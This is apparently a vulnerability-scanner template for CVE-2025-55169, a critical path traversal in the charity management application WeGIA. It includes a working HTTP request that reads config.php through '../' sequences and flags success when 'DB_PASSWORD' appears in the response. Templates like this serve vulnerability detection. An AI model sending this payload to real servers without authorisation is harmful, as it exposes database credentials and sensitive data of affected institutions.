id: CVE-2025-55169

info:
  name: WeGIA Path Traversal at endpoint 'html/socio/sistema/download_remessa.php' via parameter 'file' - Directory Traversal
  author: praivesi
  severity: critical
  description: | 
    WeGIA is an open source web manager with a focus on the Portuguese language and charitable institutions. Prior to version 3.4.8, a path traversal vulnerability was discovered in the WeGIA application, html/socio/sistema/download_remessa.php endpoint. This vulnerability could allow an attacker to gain unauthorized access to local files in the server and sensitive information stored in config.php. config.php contains information that could allow direct access to the database. This issue has been patched in version 3.4.8.
  remediation: |
    Upgrade to WeGIA version 3.4.8 or later, which patches the path traversal vulnerability.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-55169
    - https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-mm3p-7573-4x4j
    - https://www.cvedetails.com/cve/CVE-2025-55169/
    - http://13.209.7.210/
  tags: cve, path-traversal, wegia, config-disclosure, critical
  metadata:
    cve: "CVE-2025-55169"
    cwe: "CWE-22, CWE-287"
    affected_versions: "< 3.4.8"
    patched_version: "3.4.8"
  classification:
    cve-id: CVE-2025-55169
    cwe-id: CWE-22, CWE-287
    cvss-metrics: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H
    cvss-score: 10.0
    cpe: cpe:2.3:a:wegia:wegia:*:*:*:*:*:*:*:*

http:
  - raw:
      - |
        GET /html/socio/sistema/download_remessa.php?file=../../../www/html/wegia/config.php HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Connection: close

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "DB_PASSWORD"
        part: body

